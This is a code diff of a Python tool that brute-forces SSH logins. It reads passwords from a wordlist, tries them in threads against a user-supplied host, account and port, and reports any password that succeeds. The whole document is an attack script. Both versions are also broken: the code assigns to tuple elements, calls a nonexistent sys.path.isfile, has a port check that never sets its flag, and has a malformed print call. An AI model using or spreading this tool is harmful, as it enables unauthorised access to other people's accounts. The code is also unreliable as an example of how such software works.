@@ -1,60 +1,73 @@
-import os
-import sys
-import threading
-import time
-
-import paramiko
-import termcolor
-
-from portScanner import check_ip
+from sys import path  # used for accessing and using the inputted file
+from threading import Thread  # used try many passwords simultaneously
+from time import sleep  # allows to introduce a delay in the execution of the program
+from paramiko import SSHClient, AutoAddPolicy  # Creates an SSH connection, and generates a security policy
+from termcolor import colored  # adds color to outputs
+from portScanner import checkIP  # checks target machine IP
 
 stop_flag = 0
 
 
-def ssh_connect(host, username, password):
+# Initialises and creates SSH Connection
+def sshConnection(host, port, username, password):
     global stop_flag
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh = SSHClient()
+    ssh.set_missing_host_key_policy(AutoAddPolicy())
     try:
-        ssh.connect(host, port=22, username=username, password=password)
-        stop_flag = 1
-        termcolor.cprint(
-            termcolor.colored('[+] Found Password: ', 'green')
-            + termcolor.colored(password, 'yellow')
-            + termcolor.colored((', For Account: ' + username), 'yellow'))
+        ssh.connect(host, port=port, username=username, password=password)
     except:
-        termcolor.cprint(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
+        pass
+    else:
+        stop_flag = 1
+        return print(
+            colored('[+] Found Password: ', 'green') +
+            colored(password, 'yellow') +
+            colored((', For Account: ' + username), 'yellow')), True
     finally:
         ssh.close()
 
 
 if __name__ == '__main__':
     try:
-        the_right_input = False, False, False
+        the_right_input = False, False, False, False
         while not the_right_input[0]:  # Keep repeating the question until user inputs are valid
-            host = input('[+] Target Address: ').strip(' ')
+            host_ip = input('[+] Target IP Address: ').strip(' ')
             # for every ip address in the inputted targets target
-            if check_ip(host)[1]:  # check if its a valid ip
-                the_right_input[0] = True
+            if checkIP(host_ip)[0] == host_ip or host_ip.lower() == 'localhost':
+                # check if its a valid ip
+                ans = input("Is " + host_ip + " correct?")
+                if 'y' in ans:
+                    the_right_input[1] = True
+                else:
+                    pass
             else:  # if not print the error and ask the question again
-                print(host + ' not an ip address')
+                print(host_ip + ' not an ip address')
 
         while not the_right_input[1]:
-            username = input('[+] Enter SSH Username: ')
-            ans = input("Is " + username + " correct?")
-            if 'y' in ans:
-                the_right_input[1] = True
-            else:
-                pass
+            username = str(input('[+] Enter SSH Username: '))
+            if len(username) > 0:
+                ans = input("Is " + username + " correct?")
+                if 'y' in ans:
+                    the_right_input[1] = True
+                else:
+                    pass
 
         while not the_right_input[2]:
             input_file = str(input('[+] Password File: '))
-            if not sys.path.isfile(input_file):
-                print('File not found\nTry again')
+            if not path.isfile(input_file):
+                print(colored('File not found Try again', 'red'))
             else:
                 the_right_input[2] = True
+        while not the_right_input[3]:
+            port = str(input('[+] Input SSH Port NOTE: default is 22').strip(' '))
+            if port.isdigit():
+                the_right_input == True
+            else:
+                print(colored('Invalid Entry', 'red'))
 
-        print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')
+        print(colored('* * * Starting SSH Bruteforce on ', 'green') + host_ip, +
+        colored('With Account: ', 'green') + username, + colored('* * *', 'green')
+              )
 
         with open(input_file, 'r') as file:
             for line in file.readlines():
@@ -62,9 +75,12 @@ if __name__ == '__main__':
                     t.join()
                     exit()
                 password = line.strip()
-                t = threading.Thread(target=ssh_connect, args=(host, username, password,))
+                t = Thread(target=sshConnection, args=(host_ip, port, username, password,))
                 t.start()
-                time.sleep(0.5)
+                sleep(0.5)
+
+            if stop_flag == 0:
+                print('Password not found')
     except KeyboardInterrupt:
         print('bye')
         exit(0)
